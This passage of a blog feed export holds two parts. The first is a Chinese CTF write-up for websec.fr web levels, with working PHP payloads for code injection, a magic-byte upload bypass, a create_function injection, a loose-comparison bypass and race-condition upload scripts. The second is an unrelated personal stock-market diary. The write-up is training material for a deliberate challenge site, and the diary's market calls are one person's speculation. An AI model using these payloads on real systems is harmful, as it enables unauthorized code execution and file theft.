class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>]);<br><span class="hljs-variable">$corrected</span> = <span class="hljs-title function_ invoke__">preg_replace</span> (<span class="hljs-string">&quot;/([^<span class="hljs-subst">$blacklist</span>]&#123;2,&#125;)/ie&quot;</span>, <span class="hljs-string">&#x27;correct (&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$q</span>);<br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span>include_once<span class="hljs-variable">$_GET</span>[inc]&#125; <span class="hljs-variable">$&#123;</span>flag&#125;<br></code></pre></td></tr></table></figure><p>同时在url中添加<code>inc=flag.php</code>。</p><h3 id="level-08"><a href="#level-08" class="headerlink" title="level 08"></a>level 08</h3><p>首先可以搜索一下<code>exif_imagetype()</code>函数的匹配原理，它会读取文件的第一个字节并检查其签名，只要加上magic字符就绕过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br><span class="hljs-comment">// show_source(&#x27;flag.txt&#x27;)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里可能是禁用了一些命令的回显，测试了system函数看不到输出结果，改用PHP的方法打印路径文件并读取成功拿到了flag。</p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>首先查看一下获取flag的方法，需要我们输入一个hash值和一个文件名，如果相等则会访问我们输入的文件名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$request</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hash&#x27;</span>];<br><br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">substr</span> (<span class="hljs-title function_ invoke__">md5</span> (<span class="hljs-variable">$flag</span> . <span class="hljs-variable">$file</span> . <span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>, <span class="hljs-number">8</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span> == <span class="hljs-variable">$hash</span>) &#123;<br><span class="hljs-title function_ invoke__">show_source</span> (<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Permission denied!&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意到这里是弱相等，那么用0e绕过即可，但是怎样使得<code>$hash</code>出现0e呢，这里就需要构造文件名，我们需要读取flag.php，在php解析中在前面加&#x2F;并不会影响解析结果，但会影响md5的结果，这样就有了思路—爆破需要添加的&#x2F;的次数，直到绕过弱相等即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>prefix = <span class="hljs-string">&quot;./&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.post(<span class="hljs-string">&quot;http://websec.fr/level10/index.php&quot;</span>, data=&#123;<br>        <span class="hljs-string">&#x27;hash&#x27;</span>: <span class="hljs-string">&quot;0e12345&quot;</span>,<br>        <span class="hljs-string">&#x27;f&#x27;</span>: prefix + <span class="hljs-string">&#x27;flag.php&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;WEBSEC&#123;&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br><br>    prefix += <span class="hljs-string">&quot;/&quot;</span><br></code></pre></td></tr></table></figure><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>这里进行了函数创建，但并没有运行。查看create_function的官方文档，它会<code>eval</code>执行一个function __lambda_func (<fucntion-params>){<function-code>}字符串，我们可以用}提前闭合函数，并在后面注入我们需要执行的命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$flag&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$success</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>; &#125;; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>程序中有一个函数引入了随机延迟，所以时间攻击无法实现。</p><blockquote><p>时间攻击：时间攻击是一种侧信道攻击，通过测量执行某些操作所需的时间，攻击者可以推断出某些信息。例如，通过测量字符串比较操作的执行时间，攻击者可能会推断出部分字符串内容。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep_rand</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* I wish php5 had random_int() */</span><br>        <span class="hljs-variable">$range</span> = <span class="hljs-number">100000</span>;<br>        <span class="hljs-variable">$bytes</span> = (<span class="hljs-keyword">int</span>) (<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$range</span>, <span class="hljs-number">2</span>) / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">do</span> &#123;  <span class="hljs-comment">/* Side effect: more random cpu cycles wasted ;) */</span><br>            <span class="hljs-variable">$rnd</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$bytes</span>)));<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$rnd</span> &gt;= <span class="hljs-variable">$range</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-variable">$rnd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>那唯一的突破口就变成了比较传入的字符和flag是否一致的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">strcasecmp</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], <span class="hljs-variable">$flag</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27;</span> . <span class="hljs-variable">$flag</span> . <span class="hljs-string">&#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;</span>;   <br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>strcasecmp</code>函数的正常使用介绍：<a href="https://cloud.tencent.com/developer/article/2051495">https://cloud.tencent.com/developer/article/2051495</a></p><p>接触过PHP弱类型比较题型的师傅可能会知道，<code>strcmp()</code>和<code>strcasecmp()</code>函数用于比较两个字符串，前者区分大小写。这两个函数都无法处理数组，当传入数组时，返回null。所以，只需要使用POST方法传递一个<code>flag[]=1</code>即可绕过比较。</p><h3 id="level-25"><a href="#level-25" class="headerlink" title="level 25"></a>level 25</h3><p>尝试了php伪协议和通配符绕过的方法都没有成功，搜索也没有发现<code>stripos</code>函数有什么绕过方法，只能换一个思路搜索<code>parse_str</code>函数的相关问题，得知如果将正常url中的&#x2F;替换成&#x2F;&#x2F;&#x2F;，就会触发解析错误，返回false，就会跳过匹配过程。</p><blockquote><p>参考：<a href="https://www.freebuf.com/sectool/165452.html">https://www.freebuf.com/sectool/165452.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>])[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$v</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You are not allowed to get the flag, sorry :/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以只要将网址改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//websec.fr///level25///index.php?page=flag</span><br></code></pre></td></tr></table></figure><h3 id="level-28"><a href="#level-28" class="headerlink" title="level 28"></a>level 28</h3><p>主要是理解源代码，我们可以任意传一个php文件，在php文件里写读flag的内容即可，但这里程序<code>sleep(1)</code>之后就会失效，所以要立刻访问它，由于网络限制手工操作肯定是不行的，写一个自动访问的python脚本就可以解决问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">4096</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Your file is too heavy.&#x27;</span>);<br>  &#125;<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><br>  <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;r&#x27;</span>);<br>  <span class="hljs-variable">$flagfilecontent</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;flag_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]));<br>  @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$flagfilecontent</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>] == <span class="hljs-title function_ invoke__">crc32</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checksum&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);  <span class="hljs-comment">// it contains the `$flag` variable</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Nope, <span class="hljs-subst">$filename</span> is not the right file, sorry.&quot;</span>;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Deter bruteforce</span><br>    &#125;<br><br>  <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>exp.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>exp.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>md5ip=<br><br>URL = <span class="hljs-string">&quot;https://websec.fr/level28/tmp/&quot;</span><br>FILE = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;md5ip&#125;</span>.php&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/<span class="hljs-subst">&#123;FILE&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">404</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NOPE&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><p>运行python脚本的同时不断上传php文件，就可以在终端看到打印出的flag信息了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>投资日记</title>
    <link href="/2024/07/16/%E6%8A%95%E8%B5%84%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/07/16/%E6%8A%95%E8%B5%84%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<!--日期越新写在越前面--><h3 id="9月11日-周四"><a href="#9月11日-周四" class="headerlink" title="9月11日 周四"></a>9月11日 周四</h3><h4 id="A股"><a href="#A股" class="headerlink" title="A股"></a>A股</h4><p>全盘共振上涨，科技券商全面上攻突破均线，后期大盘可以看高一线，警惕爆量的连续加速，否则继续以牛市思维看待。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250911.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月10日-周三"><a href="#9月10日-周三" class="headerlink" title="9月10日 周三"></a>9月10日 周三</h3><h4 id="A股-1"><a href="#A股-1" class="headerlink" title="A股"></a>A股</h4><p>今日缩量震荡，AI产业链受益于昨日Oracle利好大幅修复，但明天难言继续强势，继续观察。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250910.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月9日-周二"><a href="#9月9日-周二" class="headerlink" title="9月9日 周二"></a>9月9日 周二</h3><h4 id="A股-2"><a href="#A股-2" class="headerlink" title="A股"></a>A股</h4><p>今日大盘缩量普跌，符合指数继续箱体震荡的预期，题材没有新的叙事出现，继续在主流方向内做高抛低吸。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250909.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月8日-周一"><a href="#9月8日-周一" class="headerlink" title="9月8日 周一"></a>9月8日 周一</h3><h4 id="A股-3"><a href="#A股-3" class="headerlink" title="A股"></a>A股</h4><p>盘面普遍修复，上证指数站上五日线，但CPO继续大跌，大阴大阳交错，巨幅震荡是等待其他板块拉到同一水平并洗盘的动作，但当前3800点附近的箱体震荡不会很快结束，继续做好高抛低吸策略。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250908.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月5日-周五"><a href="#9月5日-周五" class="headerlink" title="9月5日 周五"></a>9月5日 周五</h3><h4 id="A股-4"><a href="#A股-4" class="headerlink" title="A股"></a>A股</h4><p>全盘强势反包，仍有上涨动能，但指数大概会在箱体内强势震荡轮动，继续以高抛低吸策略操作。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250905.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月4日-周四"><a href="#9月4日-周四" class="headerlink" title="9月4日 周四"></a>9月4日 周四</h3><h4 id="A股-5"><a href="#A股-5" class="headerlink" title="A股"></a>A股</h4><p>易中天抱团瓦解，AI产业链应声下跌带崩双创，银行大幅拉升，消费成为进攻方向，等待大盘企稳资金确立新主线。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250904.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月3日-周三"><a href="#9月3日-周三" class="headerlink" title="9月3日 周三"></a>9月3日 周三</h3><h4 id="A股-6"><a href="#A股-6" class="headerlink" title="A股"></a>A股</h4><p>散户抛售发生踩踏，93已过，风格将发生改变，开始以短线高切低思想进行交易。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250903.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月2日-周二"><a href="#9月2日-周二" class="headerlink" title="9月2日 周二"></a>9月2日 周二</h3><h4 id="A股-7"><a href="#A股-7" class="headerlink" title="A股"></a>A股</h4><p>大资金提前抢跑，前期领涨核心大幅调整，明日有修复预期。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250902.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月1日-周一"><a href="#9月1日-周一" class="headerlink" title="9月1日 周一"></a>9月1日 周一</h3><h4 id="A股-8"><a href="#A股-8" class="headerlink" title="A股"></a>A股</h4><p>盛会在即，多头一致性较强，领涨核心继续上攻带动指数，上周大跌品种今日直接情绪反包，目前执行减仓策略平稳度过9月初，9月的资金炒作将会扩散到更多板块，前期容量核心可能进入高位震荡期。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250901.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月29日-周五"><a href="#8月29日-周五" class="headerlink" title="8月29日 周五"></a>8月29日 周五</h3><h4 id="A股-9"><a href="#A股-9" class="headerlink" title="A股"></a>A股</h4><p>AI产业链回调，创新药和主板科技大涨拉动盘面，大而美的股票更受行情青睐，目前继续在AI、消费电子、创新药中轮动切换即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250829.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月28日-周四"><a href="#8月28日-周四" class="headerlink" title="8月28日 周四"></a>8月28日 周四</h3><h4 id="A股-10"><a href="#A股-10" class="headerlink" title="A股"></a>A股</h4><p>指数下杀至十日线后快速拉回，AI产业链继续暴涨，机构主导大容量核心，小票被资金抛弃，要及时做好风格切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250828.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月27日-周三"><a href="#8月27日-周三" class="headerlink" title="8月27日 周三"></a>8月27日 周三</h3><h4 id="A股-11"><a href="#A股-11" class="headerlink" title="A股"></a>A股</h4><p>空头反扑，指数高位大幅跳水，获利盘大量出逃，关注回撤大的趋势龙头，可以适度抄底。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250827.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月26日-周二"><a href="#8月26日-周二" class="headerlink" title="8月26日 周二"></a>8月26日 周二</h3><h4 id="A股-12"><a href="#A股-12" class="headerlink" title="A股"></a>A股</h4><p>大盘距离五日线过远，正常回调释放获利盘，继续观察是否有震荡走弱趋势，否则依然相信大盘会持续强势并最终加速。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250826.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月25日-周一"><a href="#8月25日-周一" class="headerlink" title="8月25日 周一"></a>8月25日 周一</h3><h4 id="A股-13"><a href="#A股-13" class="headerlink" title="A股"></a>A股</h4><p>成交量突破3万亿，盘中分歧后再度拉回，人工智能大涨，产业链炒作会继续持续。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250825.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月22日-周五"><a href="#8月22日-周五" class="headerlink" title="8月22日 周五"></a>8月22日 周五</h3><h4 id="A股-14"><a href="#A股-14" class="headerlink" title="A股"></a>A股</h4><p>DS引爆半导体行情，大容量核心集体暴涨，周末广告效应牛市意味明显，可以继续持有观察。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250822.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月21日-周四"><a href="#8月21日-周四" class="headerlink" title="8月21日 周四"></a>8月21日 周四</h3><h4 id="A股-15"><a href="#A股-15" class="headerlink" title="A股"></a>A股</h4><p>资金继续高低切，大量高标高开低走，观察明日是否修复打出广告效应。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250821.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月20日-周三"><a href="#8月20日-周三" class="headerlink" title="8月20日 周三"></a>8月20日 周三</h3><h4 id="A股-16"><a href="#A股-16" class="headerlink" title="A股"></a>A股</h4><p>大盘受外围影响大幅低开，科技股领跌，下午缩量拉升，半导体领涨，盯住券商是否启动加速。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250820.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月19日-周二"><a href="#8月19日-周二" class="headerlink" title="8月19日 周二"></a>8月19日 周二</h3><h4 id="A股-17"><a href="#A股-17" class="headerlink" title="A股"></a>A股</h4><p>热点题材震荡回调，大盘有回调五日均线需求，成交继续活跃，短期无需过度谨慎。</p><h3 id="8月18日-周一"><a href="#8月18日-周一" class="headerlink" title="8月18日 周一"></a>8月18日 周一</h3><h4 id="A股-18"><a href="#A股-18" class="headerlink" title="A股"></a>A股</h4><p>易中天继续暴涨，科技全面开花，成交量继续新高，等待大盘出现放量滞涨或加速信号，下旬或有风格切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250818.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月15日-周五"><a href="#8月15日-周五" class="headerlink" title="8月15日 周五"></a>8月15日 周五</h3><h4 id="A股-19"><a href="#A股-19" class="headerlink" title="A股"></a>A股</h4><p>金融科技和证券带领指数冲关，广告效应显著，短期题材会依然活跃，继续持筹，观察技术形态。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250815.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月14日-周四"><a href="#8月14日-周四" class="headerlink" title="8月14日 周四"></a>8月14日 周四</h3><h4 id="A股-20"><a href="#A股-20" class="headerlink" title="A股"></a>A股</h4><p>互联金融大涨，但科技题材全部回调，目前成交仍然活跃，依然有指数加速冲关的机会。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250814.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月13日-周三"><a href="#8月13日-周三" class="headerlink" title="8月13日 周三"></a>8月13日 周三</h3><h4 id="A股-21"><a href="#A股-21" class="headerlink" title="A股"></a>A股</h4><p>指数创下新高，微盘股弱势，港股大涨跟随，题材大科技轮番表现，行情会具备一定持续性。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/250813.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月12日-周二"><a href="#8月12日-周二" class="headerlink" title="8月12日 周二"></a>8月12日 周二</h3><h4 id="A股-22"><a href="#A股-22" class="headerlink" title="A股"></a>A股</h4><p>指数继续上攻，但题材不够强势，港股也横盘震荡，空头进场窗口可能在近期出现。</p><p><img 